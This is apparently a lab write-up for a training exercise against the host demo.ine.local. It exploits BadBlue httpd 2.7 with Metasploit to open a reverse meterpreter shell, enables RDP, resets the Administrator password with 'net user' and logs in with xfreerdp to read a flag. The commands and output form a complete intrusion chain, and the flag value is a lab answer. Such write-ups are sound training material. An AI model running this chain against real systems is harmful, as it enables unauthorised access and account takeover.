# Enable RDP

Exploit one of the service runnning on the target
```bash
msf6 > db_nmap -sV -O 10.0.19.192
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 07:53 IST
[*] Nmap: Nmap scan report for demo.ine.local (10.0.19.192)
[*] Nmap: Host is up (0.0031s latency).
[*] Nmap: Not shown: 992 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 80/tcp    open  http         BadBlue httpd 2.7   <- Exploit this
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

msf6 > search badblue
msf6 > use exploit/windows/http/badblue_passthru
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > 
msf6 exploit(windows/http/badblue_passthru) > run

[*] Started reverse TCP handler on 10.10.43.5:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (176198 bytes) to 10.0.19.192
[*] Meterpreter session 1 opened (10.10.43.5:4444 -> 10.0.19.192:49288) at 2025-07-25 07:56:53 +0530

meterpreter >
```

Enable RDP
```bash
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/badblue_passthru) > search enable rdp
msf6 exploit(windows/http/badblue_passthru) > use post/windows/manage/enable_rdp
msf6 post(windows/manage/enable_rdp) > sessions

Active sessions
===============

  Id  Name  Type                Information          Connection
  --  ----  ----                -----------          ----------
  1         meterpreter x86/wi  NT AUTHORITY\SYSTEM  10.10.43.5:4444 ->
            ndows                @ WIN-OMCNBKR66MN   10.0.19.192:49288 (
                                                     10.0.19.192)

msf6 post(windows/manage/enable_rdp) > set SESSION 1
SESSION => 1

msf6 post(windows/manage/enable_rdp) > run

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[+]     RDP Service Started
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20250725075833_default_10.0.19.192_host.windows.cle_836328.txt
[*] Post module execution completed


# Check if RDP is enabled (port 3389 is open!)
msf6 post(windows/manage/enable_rdp) > db_nmap -p 3389 -sV 10.0.19.192
[*] Nmap: Service scan Timing: About 0.00% done
[*] Nmap: Nmap scan report for demo.ine.local (10.0.19.192)
[*] Nmap: Host is up (0.0045s latency).
[*] Nmap: PORT     STATE SERVICE            VERSION
[*] Nmap: 3389/tcp open  ssl/ms-wbt-server?
```

Go back to the meterpreter session and change "administrator" password to log in RDP with `xfreerdp`
```bash
meterpreter > shell
Process 144 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

# List all the users
C:\Windows\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    
The command completed with one or more errors

# Change password
C:\Windows\system32>net user administrator hacke_112233
net user administrator hacke_112233
The command completed successfully.
```

xfreerdp
```bash
xfreerdp /u:administrator /p:hacke_112233 /v:10.0.19.192
[08:06:15:849] [7970:7971] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[08:06:15:849] [7970:7971] [WARN][com.freerdp.crypto] - CN = WIN-OMCNBKR66MN

# flag.txt on desktop of the target machine
763e1c86da26c66e86a8537fd343280d
```